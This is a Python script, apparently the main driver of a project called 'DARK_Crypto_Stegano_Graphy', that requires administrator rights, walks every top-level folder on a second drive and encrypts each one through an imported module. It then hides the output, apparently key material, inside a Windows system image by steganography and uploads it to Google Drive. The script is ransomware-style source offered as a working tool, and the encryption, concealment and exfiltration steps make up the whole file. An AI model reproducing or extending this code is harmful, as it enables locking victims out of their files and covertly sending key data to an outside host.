import Encryption_Folder
import Image_Steganography
import Google_Drive_API
import os
import time
import psutil
import ctypes
import sys
import socket

#Check For Internet Connection
def Internet_Connected():
    try:
        # Attempt to create a socket connection to a well-known website
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False

#Ask For Run As Administrator
def run_as_admin():
  
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    else:
        # ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, sys.argv[0], None, 1)
        return False


if run_as_admin():
    if Internet_Connected():
        print("Internet Connection Active")

        #For Drive Letter
        def list_drive_letters():
            drive_letters = set()
            partitions = psutil.disk_partitions(all=True)

            for partition in partitions:
                if partition.device and partition.mountpoint:
                    drive_letter = partition.device[0].upper() + ":"
                    drive_letters.add(drive_letter)

            return sorted(drive_letters)

        drive_letters = list_drive_letters()

        print(drive_letters[1])

        A=drive_letters[1]

        drive_letter = A+"\\"  # Change this to the drive letter you want to list folders from

        if os.path.exists(drive_letter) and os.path.isdir(drive_letter):
            folder_names = [d for d in os.listdir(drive_letter) if os.path.isdir(os.path.join(drive_letter, d))]
            
        else:
            print(f"The drive {drive_letter} does not exist or is not a valid directory.")


        #Define Path For Aceess
        # Main_File_Path=r'E:\Codeing\Python Language\Projects\Project_14_Crypto_Stegano_Graphy\User_Data'
        Steganography_Image = r"C:\Windows\WinSxS\amd64_microsoft-windows-healthcenter_31bf3856ad364e35_10.0.19041.746_none_89566cffc2a3c072\SecurityAndMaintenance_Alert.png"  # Your input audio file
        Steganography_Image_Output = r"C:\Users\Image_With_Hidden_Message.png"
        Google_API_Credentials_Key=r"E:\Codeing\Python Language\Projects\Project_14_DARK_Crypto_Stegano_Graphy\Credentials_Key.json"
        # Get the directory of the current script
        script_dir = os.path.dirname(os.path.abspath(__file__))
        # Define the relative path to the credentials file from the script directory
        credentials_file = 'Credentials_Key.json'
        # Combine the script directory and the credentials file to get the full path
        Google_API_Credentials_Key = os.path.join(script_dir, credentials_file)


        for folder in folder_names:
            # print(f"Folders in {drive_letter}:")
            Main_File_Path=rf'{drive_letter}{folder}'

            if folder == "$RECYCLE.BIN":
                continue

            print(Main_File_Path)
  
            #Step-1
            Setp_1=Encryption_Folder.Encrypt(Main_File_Path,folder)


        Setp_2=Image_Steganography.hide_text_in_image(Steganography_Image,Steganography_Image_Output,Setp_1)

        Google_Drive_API.Google_Drive_API(Setp_2,Google_API_Credentials_Key)
        
    else:
        print("No internet connection.")
else:
    exit()